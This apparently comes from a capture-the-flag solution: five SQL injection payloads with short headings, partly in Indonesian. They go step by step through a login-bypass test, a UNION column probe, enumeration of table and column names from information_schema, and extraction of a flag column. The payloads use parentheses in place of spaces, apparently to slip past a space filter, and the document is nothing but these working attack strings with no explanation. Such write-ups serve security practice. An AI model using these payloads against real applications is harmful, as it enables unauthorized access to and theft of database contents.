## Test SQLi
```
\'or(1)#
```

## Test Union
```
\'union(select(0),0,0,0,0,0,0)#
```

## Tabel
```
\'union(select(0),0,0,(select(group_concat(table_name))from(information_schema.tables)),0,0,0)#
```

## Kolom
```
\'union(select(0),0,0,(select(group_concat(column_name))from(information_schema.columns)),0,0,0)#
```

## Flag
```
\'union(select(0),0,0,(select(group_concat(fLaGz_15_HERE))from(flag)),0,0,0)#
```
